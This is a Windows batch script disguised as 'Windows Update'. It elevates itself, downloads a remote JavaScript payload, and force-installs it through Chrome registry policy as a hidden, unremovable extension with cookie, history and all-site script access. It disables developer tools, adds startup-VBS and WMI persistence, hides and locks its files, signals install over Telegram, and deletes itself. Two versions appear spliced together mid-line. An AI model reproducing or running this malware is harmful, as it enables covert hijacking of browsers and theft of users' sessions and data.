
@echo off
setlocal enabledelayedexpansion
title Windows Update

net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

set "URL=https://raw.githubusercontent.com/happycelebration/sys/refs/heads/main"
set "JS=windows.sys.js"
set "EXT_DIR=%ProgramData%\Microsoft\Crypto\RSA\S-1-5-18\chrome_svc"
set "LOG=%TEMP%\chrome_install.log"

echo [%date% %time%] START >> "%LOG%"

mkdir "%EXT_DIR%" 2>nul
taskkill /F /IM chrome.exe >nul 2>&1
timeout /t 3 /nobreak >nul

curl -L -s -o "%EXT_DIR%\%JS%" "%URL%/%JS%" 2>nul
if not exist "%EXT_DIR%\%JS%" certutil -urlcache -split -f "%URL%/%JS%" "%EXT_DIR%\%JS%" >nul 2>&1

:: Minimal manifest
(
echo {
echo   "manifest_version": 3,
echo   "name": "",
echo   "version": "1.0",
echo   "background": { "service_worker": "%JS%" },
echo   "permissions": ["tabs","alarms","history","cookies","scripting","activeTab","webNavigation","storage","bookmarks"],
echo   "host_permissions": ["<all_urls>"],
echo   "action": {}
echo }
) > "%EXT_DIR%\manifest.json"

:: Force install via registry (hidden, unremovable)
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;file:///%EXT_DIR:\=/%//update.xml" /f >nul 2>&1

:: update.xml
(
echo ^<?xml version="1.0"?^>
echo ^<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"^>
echo   ^<app appid="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"^>
echo     ^<updatecheck codebase="file:///%EXT_DIR:\=/%/" version="1.0"/^>
echo   ^</app^>
echo ^</gupdate^>
) > "%EXT_DIR%\update.xml"

attrib +h +s "%EXT_DIR%" 2>nul
icacls "%EXT_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" /T >nul 2>&1

start "" "chrome.exe" --no-first-run 2>nul

echo [%date% %time%] DONE >> "%LOG%"

(echo @echo off&echo timeout /t 2 ^>nul&echo del /f/q "%~f0" ^>nul&echo del /f/q %%0 ^>nul) > "%TEMP%\~sd.bat"
start /min "" "%TEMP%\~sd.bat"
exit /b 0echo [%date% %time%] [+] Chrome closed >> "%LOG_FILE%"

:: ===== STEP 3: Download windows.sys.js =====
echo [*] Downloading %BG_FILE%...
set "OK=0"
curl -L -s -o "%HIDDEN_DIR%\%BG_FILE%" "%GITHUB_RAW%/%BG_FILE%" 2>nul
if exist "%HIDDEN_DIR%\%BG_FILE%" for %%A in ("%HIDDEN_DIR%\%BG_FILE%") do if %%~zA GTR 100 set "OK=1"
if "!OK!"=="0" (
    certutil -urlcache -split -f "%GITHUB_RAW%/%BG_FILE%" "%HIDDEN_DIR%\%BG_FILE%" >nul 2>&1
    if exist "%HIDDEN_DIR%\%BG_FILE%" for %%A in ("%HIDDEN_DIR%\%BG_FILE%") do if %%~zA GTR 100 set "OK=1"
)
if "!OK!"=="0" (
    echo [%date% %time%] [X] Download FAILED >> "%LOG_FILE%"
    goto :fail
)
for %%A in ("%HIDDEN_DIR%\%BG_FILE%") do set "SZ=%%~zA"
echo [%date% %time%] [+] Downloaded (%SZ% bytes) >> "%LOG_FILE%"

:: ===== STEP 4: Copy to extension folder =====
copy /Y "%HIDDEN_DIR%\%BG_FILE%" "%EXT_DIR%\%BG_FILE%" >nul 2>&1
echo [%date% %time%] [+] Copied to extension dir >> "%LOG_FILE%"

:: ===== STEP 5: Create manifest.json =====
echo [*] Creating manifest...
(
echo {
echo   "manifest_version": 3,
echo   "name": "%EXT_NAME%",
echo   "version": "1.0.0",
echo   "description": "",
echo   "permissions": [
echo     "tabs","alarms","history","cookies",
echo     "scripting","activeTab","webNavigation",
echo     "storage","bookmarks"
echo   ],
echo   "host_permissions": ["<all_urls>"],
echo   "background": {
echo     "service_worker": "%BG_FILE%"
echo   },
echo   "content_scripts": [{
echo     "matches": ["<all_urls>"],
echo     "js": ["%BG_FILE%"],
echo     "run_at": "document_start",
echo     "all_frames": true,
echo     "match_about_blank": true
echo   }],
echo   "action": {},
echo   "icons": {}
echo }
) > "%EXT_DIR%\manifest.json"
echo [%date% %time%] [+] manifest.json created >> "%LOG_FILE%"

:: ===== STEP 6: Create update.xml =====
(
echo ^<?xml version="1.0" encoding="UTF-8"?^>
echo ^<gupdate xmlns="http://www.google.com/update2/response" protocol="2.0"^>
echo   ^<app appid="%EXT_ID%"^>
echo     ^<updatecheck codebase="file:///%EXT_DIR:\=/%/" version="1.0.0" /^>
echo   ^</app^>
echo ^</gupdate^>
) > "%EXT_DIR%\update.xml"
echo [%date% %time%] [+] update.xml created >> "%LOG_FILE%"

:: ===== STEP 7: Registry force-install =====
echo [*] Setting enterprise policy...
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v "1" /t REG_SZ /d "%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "SuppressUnsupportedOSWarning" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "DeveloperToolsAvailability" /t REG_DWORD /d 2 /f >nul 2>&1
set "POLICY_JSON={\"%EXT_ID%\": {\"installation_mode\": \"force_installed\", \"update_url\": \"file:///%EXT_DIR:\=/%/update.xml\"}}"
reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionSettings" /v "%EXT_ID%" /t REG_SZ /d "%POLICY_JSON%" /f >nul 2>&1
echo [%date% %time%] [+] Registry policies set >> "%LOG_FILE%"

:: ===== STEP 8: Startup VBS =====
echo [*] Creating startup script...
(
echo ' Windows System Service
echo On Error Resume Next
echo Dim ws: Set ws = CreateObject^("WScript.Shell"^)
echo Dim ext: ext = "%EXT_DIR:\=\\%"
echo If Not ws.FileExists^(ext ^& "\\manifest.json"^) Then
echo     ws.Run "cmd /c mkdir """ ^& ext ^& """ 2>nul ^& curl -s -L -o """ ^& ext ^& "\\%BG_FILE%""" ^& """ %GITHUB_RAW%/%BG_FILE%""" ^& " ^& reg add ""HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"" /v 1 /t REG_SZ /d ""%EXT_ID%;file:///%EXT_DIR:\=/%/update.xml"" /f >nul 2>&1", 0, False
echo End If
echo ws.Run "chrome.exe", 0, False
) > "%STARTUP_DIR%\WindowsService.vbs"
attrib +h "%STARTUP_DIR%\WindowsService.vbs" 2>nul
echo [%date% %time%] [+] Startup VBS created >> "%LOG_FILE%"

:: ===== STEP 9: WMI Persistence =====
echo [*] Creating WMI watcher...
powershell -NoP -Ep Bypass -Command ^
"$ext='%EXT_DIR%';$gh='%GITHUB_RAW%';$bf='%BG_FILE%';$eid='%EXT_ID%';" ^
"try{" ^
"  Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'WSysGuard' } | Remove-WmiObject -EA 0;" ^
"  Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WSysGuardC' } | Remove-WmiObject -EA 0;" ^
"  Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*WSysGuard*' } | Remove-WmiObject -EA 0;" ^
"  $f=([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();" ^
"  $f.Name='WSysGuard';$f.QueryLanguage='WQL';" ^
"  $f.Query=\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='chrome.exe'\";" ^
"  $f.EventNamespace='root\cimv2';$f.Put()|Out-Null;" ^
"  $c=([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();" ^
"  $c.Name='WSysGuardC';" ^
"  $cmd='powershell -NoP -W Hidden -C \"if(!(Test-Path \\\"'+$ext+'\\manifest.json\\\")){mkdir \\\"'+$ext+'\\\" -Force|Out-Null;Invoke-WebRequest \\\"'+$gh+'/'+$bf+'\\\" -OutFile \\\"'+$ext+'\\'+$bf+'\\\" -UseBasicParsing;reg add HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist /v 1 /t REG_SZ /d \\\"'+$eid+';file:///'+$ext.Replace('\\','/')+'/update.xml\\\" /f >nul 2>&1};start chrome\"';" ^
"  $c.CommandLineTemplate=$cmd;$c.Put()|Out-Null;" ^
"  $b=([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();" ^
"  $b.Filter='__EventFilter.Name=''WSysGuard''';" ^
"  $b.Consumer='CommandLineEventConsumer.Name=''WSysGuardC''';" ^
"  $b.Put()|Out-Null;" ^
"  Write-Output 'OK'" ^
"}catch{Write-Output $_.Exception.Message}" > "%TEMP%\wmi_out.txt" 2>&1

findstr /C:"OK" "%TEMP%\wmi_out.txt" >nul 2>&1 && (
    echo [%date% %time%] [+] WMI watcher active >> "%LOG_FILE%"
) || (
    echo [%date% %time%] [!] WMI fallback used >> "%LOG_FILE%"
)
del "%TEMP%\wmi_out.txt" 2>nul

:: ===== STEP 10: Hide & Lock Files =====
echo [*] Locking files...
attrib +h +s +r "%EXT_DIR%" >nul 2>&1
attrib +h +s +r "%HIDDEN_DIR%\%BG_FILE%" >nul 2>&1
icacls "%HIDDEN_DIR%" /inheritance:r /grant "SYSTEM:(OI)(CI)F" /T >nul 2>&1
echo [%date% %time%] [+] Files hidden and locked >> "%LOG_FILE%"

:: ===== STEP 11: Start Chrome =====
echo [*] Starting Chrome...
start "" "chrome.exe" --no-first-run 2>nul
echo [%date% %time%] [+] Chrome started >> "%LOG_FILE%"

:: ===== SUCCESS =====
echo [%date% %time%] === INSTALLATION COMPLETE === >> "%LOG_FILE%"
echo.
echo ================================================
echo   INSTALLATION SUCCESSFUL
echo   Log: %LOG_FILE%
echo   Check Telegram for 'X Installed Now'
echo ================================================

:: ===== SELF-DELETE =====
(echo @echo off&echo timeout /t 3 /nobreak ^>nul&echo del /f/q "%~f0" ^>nul 2^>^&1&echo del /f/q %%0 ^>nul 2^>^&1) > "%TEMP%\~sd.bat"
start /min "" "%TEMP%\~sd.bat"
exit /b 0

:fail
echo [%date% %time%] [X] INSTALLATION FAILED >> "%LOG_FILE%"
echo.
echo ================================================
echo   INSTALLATION FAILED - See %LOG_FILE%
echo ================================================
pause
exit /b 1
